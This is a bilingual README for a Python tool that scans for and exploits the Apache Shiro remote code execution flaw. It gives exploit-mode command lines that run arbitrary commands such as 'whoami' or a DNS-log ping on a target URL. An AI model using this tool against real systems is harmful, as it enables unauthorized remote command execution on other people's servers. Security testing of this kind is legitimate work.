# Shiro-Rce-Tool
一个简单的Shiro RCE检测和利用脚本。- Simple scanner and exploit for Shiro RCE.
  
![GitHub License](https://img.shields.io/github/license/Hack3rHan/Shiro-Rce-Tool)

## 声明 WARNING
* 仅供安全人员验证、测试是否存在此漏洞。  
* It is only for security researcher to verify and test whether this vulnerability exists.  
* **使用此工具检测必须遵守请使用者遵守[《中华人民共和国网络安全法》](https://www.gov.cn/xinwen/2016-11/07/content_5129723.htm) 以及当地的法律，勿用于非授权的测试，本人不负任何连带法律责任。**  
* **Users must obey [the Cybersecurity Law of the People's Republic of China](https://www.gov.cn/xinwen/2016-11/07/content_5129723.htm)  and local laws.**

## 使用方法 - Usage
**你可以根据你的需求调整data目录下的keys.enable.txt和keys.disable.txt。**  
**You can change the data/keys.enable.txt and data/keys.disable.txt as you like.**  
  
**建议只使用Scan模式检测漏洞，不建议在不了解该漏洞的情况下使用Exploit模式。**  
**It is recommended to only use Scan mode to verify vulnerabilities, and it is not recommended to use Exploit mode without a good knowledge of this vulnerability.**  

* 安装需要的包 - Install required packages  
```bash
pip install -r requirements.txt
```

* 检查该漏洞 - To scan this vulnerability
```bash
python ShiroRceTool.py -m scan -u "http://example.com"
```
  
* 执行命令 (不回显) - Execute command with no echo
```bash
python ShiroRceTool.py -m exploit -u "http://example.com" -c "ping dnslog.example.com"
```
  
* 执行命令（尝试回显） - Execute command with echo
```bash
python ShiroRceTool.py -m exploit -u "http://example.com" -c "whoami" -e
```
  
* 获取帮助 - Get help
```bash
python ShiroRceTool.py
 ____  _     _           ____         _____           _
/ ___|| |__ (_)_ __ ___ |  _ \ ___ __|_   _|__   ___ | |
\___ \| '_ \| | '__/ _ \| |_) / __/ _ \| |/ _ \ / _ \| |
 ___) | | | | | | | (_) |  _ < (_|  __/| | (_) | (_) | |
|____/|_| |_|_|_|  \___/|_| \_\___\___||_|\___/ \___/|_|

                        By: Hack3rHan

usage: ShiroRceTool.py [-h] [-m MODE] [-u URL] [-c CMD] [-e]

options:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  "exploit" or "scan".
  -u URL, --url URL     URL of the target.
  -c CMD, --cmd CMD     Command to execute.
  -e, --echo            Echo mode.
```